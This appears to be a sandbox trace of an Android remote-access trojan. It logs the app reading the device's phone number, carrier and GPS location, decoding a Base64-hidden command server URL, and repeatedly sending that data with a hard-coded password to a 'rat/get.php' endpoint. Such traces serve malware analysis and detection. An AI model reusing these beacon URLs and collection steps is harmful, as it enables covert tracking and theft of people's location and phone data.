{"timestamp":1520989561445,"result":"HTTP\/1.1 200 OK","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=296&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1520989561475,"result":"HTTP\/1.1 200 OK","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=296&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1520989561481,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie"]}
{"timestamp":1520989561480,"result":{"request_method":"GET","response_message":"Found","url":"https:\/\/www.hugedomains.com\/domain_profile.cfm?d=pizzachip&e=com","version":"HTTP\/1.1","response_code":302},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie","args":[]}
{"timestamp":1520989577567,"result":"Android","class":"android.os.SystemProperties","method":"get","type":"content","args":["gsm.operator.alpha"]}
{"timestamp":1520989577592,"result":"Android","class":"android.telephony.TelephonyManager","method":"getNetworkOperatorName","type":"fingerprint","args":[]}
{"timestamp":1520989577620,"result":"15555215554","class":"android.telephony.TelephonyManager","method":"getLine1Number","type":"fingerprint","args":[]}
{"timestamp":1520989577631,"result":"37.421998333333335","class":"android.location.Location","method":"getLatitude","type":"content","args":[]}
{"timestamp":1520989577634,"result":"-122.08400000000002","class":"android.location.Location","method":"getLongitude","type":"content","args":[]}
{"timestamp":1520989577672,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com"]}
{"timestamp":1520989577607,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat"]}
{"timestamp":1520989577606,"result":{"request_method":"GET","response_message":"Found","url":"https:\/\/www.hugedomains.com\/domain_profile.cfm?d=pizzachip&e=com","version":"HTTP\/1.1","response_code":302},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat","args":[]}
{"timestamp":1520989577726,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0","32","0"]}
{"timestamp":1520989577746,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1520989577752,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1520989577783,"result":{"mModified":{"URL":"http:\/\/pizzachip.com\/rat"},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putString","type":"globals","args":["URL","http:\/\/pizzachip.com\/rat"]}
{"timestamp":1520989577803,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["https:\/\/www.hugedomains.com"]}
{"timestamp":1520989578612,"result":"HTTP\/1.1 200 OK","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":[{"port":-1,"lcHostname":"pizzachip.com","hostname":"pizzachip.com","schemeName":"http"},"GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=146&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1520989578617,"result":"HTTP\/1.1 200 OK","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=146&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1520989578638,"result":"HTTP\/1.1 200 OK","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=146&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1520989578670,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie"]}
{"timestamp":1520989578649,"result":{"request_method":"GET","response_message":"Found","url":"https:\/\/www.hugedomains.com\/domain_profile.cfm?d=pizzachip&e=com","version":"HTTP\/1.1","response_code":302},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie","args":[]}
{"timestamp":1520989594764,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat"]}
{"timestamp":1520989594770,"result":"Android","class":"android.os.SystemProperties","method":"get","type":"content","args":["gsm.operator.alpha"]}
{"timestamp":1520989594778,"result":"Android","class":"android.telephony.TelephonyManager","method":"getNetworkOperatorName","type":"fingerprint","args":[]}
{"timestamp":1520989594787,"result":"15555215554","class":"android.telephony.TelephonyManager","method":"getLine1Number","type":"fingerprint","args":[]}
{"timestamp":1520989594800,"result":"37.421998333333335","class":"android.location.Location","method":"getLatitude","type":"content","args":[]}
{"timestamp":1520989594805,"result":"-122.08400000000002","class":"android.location.Location","method":"getLongitude","type":"content","args":[]}
{"timestamp":1520989594823,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com"]}
{"timestamp":1520989594763,"result":{"request_method":"GET","response_message":"Found","url":"https:\/\/www.hugedomains.com\/domain_profile.cfm?d=pizzachip&e=com","version":"HTTP\/1.1","response_code":302},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat","args":[]}
{"timestamp":1520989594853,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0","32","0"]}
{"timestamp":1520989594876,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1520989594879,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1520989594888,"result":{"mModified":{"URL":"http:\/\/pizzachip.com\/rat"},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putString","type":"globals","args":["URL","http:\/\/pizzachip.com\/rat"]}
{"timestamp":1520989595212,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["https:\/\/www.hugedomains.com"]}
{"timestamp":1520989595733,"result":"HTTP\/1.1 200 OK","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":[{"port":-1,"lcHostname":"pizzachip.com","hostname":"pizzachip.com","schemeName":"http"},"GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=419&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1520989595772,"result":"HTTP\/1.1 200 OK","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=419&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1520989595790,"result":"HTTP\/1.1 200 OK","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=419&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1520989595843,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie"]}
{"timestamp":1520989595842,"result":{"request_method":"GET","response_message":"Found","url":"https:\/\/www.hugedomains.com\/domain_profile.cfm?d=pizzachip&e=com","version":"HTTP\/1.1","response_code":302},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie","args":[]}
{"timestamp":1520989611930,"result":"Android","class":"android.os.SystemProperties","method":"get","type":"content","args":["gsm.operator.alpha"]}
{"timestamp":1520989611934,"result":"Android","class":"android.telephony.TelephonyManager","method":"getNetworkOperatorName","type":"fingerprint","args":[]}
{"timestamp":1520989611949,"result":"15555215554","class":"android.telephony.TelephonyManager","method":"getLine1Number","type":"fingerprint","args":[]}
{"timestamp":1520989611959,"result":"37.421998333333335","class":"android.location.Location","method":"getLatitude","type":"content","args":[]}
{"timestamp":1520989611964,"result":"-122.08400000000002","class":"android.location.Location","method":"getLongitude","type":"content","args":[]}
{"timestamp":1520989611983,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com"]}
{"timestamp":1520989611925,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat"]}
{"timestamp":1520989611924,"result":{"request_method":"GET","response_message":"Found","url":"https:\/\/www.hugedomains.com\/domain_profile.cfm?d=pizzachip&e=com","version":"HTTP\/1.1","response_code":302},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat","args":[]}
{"timestamp":1520989612031,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0","32","0"]}
{"timestamp":1520989612049,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["https:\/\/www.hugedomains.com"]}
{"timestamp":1520989612061,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1520989612070,"result":"http:\/\/pizzachip.com\/rat","class":"android.util.Base64","method":"decode","type":"generic","args":["aHR0cDovL3BpenphY2hpcC5jb20vcmF0","0"]}
{"timestamp":1520989612086,"result":{"mModified":{"URL":"http:\/\/pizzachip.com\/rat"},"mClear":false},"class":"android.app.SharedPreferencesImpl$EditorImpl","method":"putString","type":"globals","args":["URL","http:\/\/pizzachip.com\/rat"]}
{"timestamp":1520989612634,"result":"HTTP\/1.1 200 OK","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":[{"port":-1,"lcHostname":"pizzachip.com","hostname":"pizzachip.com","schemeName":"http"},"GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=787&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1520989612673,"result":"HTTP\/1.1 200 OK","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=787&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1520989612730,"result":"HTTP\/1.1 200 OK","class":"org.apache.http.impl.client.AbstractHttpClient","method":"execute","type":"network","args":["GET http:\/\/pizzachip.com\/rat\/get.php?UID=5056ad7d6c8edd62&Provider=Cellcom&Phone_Number=97259916243&Coordinates=37.421998333333335,-122.08400000000002&Device=Nexus5&Sdk=16&Version=1&Random=787&Password=keylimepie HTTP\/1.1\n\n"]}
{"timestamp":1520989612736,"result":[{"type":"DIRECT"}],"class":"java.net.ProxySelectorImpl","method":"select","type":"generic","args":["http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie"]}
{"timestamp":1520989612735,"result":{"request_method":"GET","response_message":"Found","url":"https:\/\/www.hugedomains.com\/domain_profile.cfm?d=pizzachip&e=com","version":"HTTP\/1.1","response_code":302},"class":"java.net.URL","method":"openConnection","type":"network","this":"http:\/\/pizzachip.com\/rat\/get-functions.php?UID=5056ad7d6c8edd62&Password=keylimepie","args":[]}
